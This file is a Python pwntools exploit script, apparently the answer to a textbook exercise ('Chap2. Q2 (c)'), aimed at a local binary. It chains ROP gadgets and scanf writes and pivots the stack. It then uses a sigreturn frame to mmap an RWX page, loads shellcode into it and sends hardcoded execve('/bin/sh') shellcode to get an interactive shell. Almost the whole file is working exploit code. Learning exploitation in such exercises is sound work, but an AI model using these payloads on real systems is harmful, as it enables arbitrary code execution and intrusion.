#!/usr/bin/python -i

# answer to Chap2. Q2 (c)

from pwn import *

context.arch = 'amd64'

r = process('./answer')

gdb.attach(r)

syscall_gadget = 0x400613

pop_rdi = 0x4006a3
ret = 0x4006a4
pop_rsi_r15 = 0x4006a1
pop_rsp_3reg = 0x40069d

scanf_plt = 0x4004a0
printf_plt = 0x400480

fmtstr = 0x4006d3
writeable_pos = 0x601800

new_fmtstr = writeable_pos - 0x400

mapaddr = 0x11000

len15str = 0x400244

p = cyclic(24)

# sigreturn, shellcode version

exec_shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"


def aligned_srop_call(stacktop=0, **kwargs):
    p = ''
    p += p64(pop_rdi)
    p += p64(len15str)
    p += p64(printf_plt)
    p += p64(ret)  # align padding
    p += p64(syscall_gadget)
    frame = SigreturnFrame()
    for kw in kwargs.keys():
        frame[kw] = kwargs[kw]
    if not 'rsp' in kwargs.keys():
        frame.rsp = stacktop + len(p) + len(str(frame))
    p += str(frame)
    return p


def blank_shower(payload_str, charset):
    return "".join(['.' if _ in charset else '#' for _ in payload_str])


def assert_no_blank(payload_str,
                    blank_count=0,
                    charset='\x09\x0a\x0b\x0c\x0d\x20'):
    bs = blank_shower(payload_str, charset)
    if len(bs.split('.')) != blank_count + 1:
        print "Payload will be truncated. Attack fail! Payload layout:"
        print bs
        exit(0)


def rop_call(rip=0, rdi=0, rsi=0):
    p = ''
    p += p64(pop_rdi)
    p += p64(rdi)
    p += p64(pop_rsi_r15)
    p += p64(rsi)
    p += p64(0xdeadbeeffeedbeef)
    p += p64(rip)
    return p


def scanf_call(rdi=0, rsi=0):
    return rop_call(scanf_plt, rdi, rsi)


asc_len = len(aligned_srop_call())

p += scanf_call(fmtstr, new_fmtstr)
p += scanf_call(new_fmtstr, writeable_pos - 1)
p += p64(pop_rsp_3reg)
p += p64(writeable_pos - 8 * 3)

assert_no_blank(p)

p2 = ''

p2 += aligned_srop_call(
    rsp=writeable_pos + len(p2) + asc_len,
    rbp=writeable_pos + len(p2) + asc_len - 8,
    rip=syscall_gadget,
    rax=9,  # sys_mmap
    rdi=mapaddr,  # addr
    rsi=0x1000,  # length
    rdx=7,  # prot = rwx
    r10=0x32,  # anonymous, fixed, private
    r8=(1 << 64) - 1,  # fd
    r9=0  # offset
)
p2 += scanf_call(fmtstr, mapaddr)
p2 += p64(mapaddr)
p2 += cyclic(512 - len(p2))

raw_input('first payload    ->')

r.send(p + '\n1295\n%513c\n' + p2 + asm(
    shellcraft.linux.read(0, mapaddr + 0x17, 4000)) + '\n')

raw_input('second payload   ->')

r.send(exec_shellcode)

r.interactive()
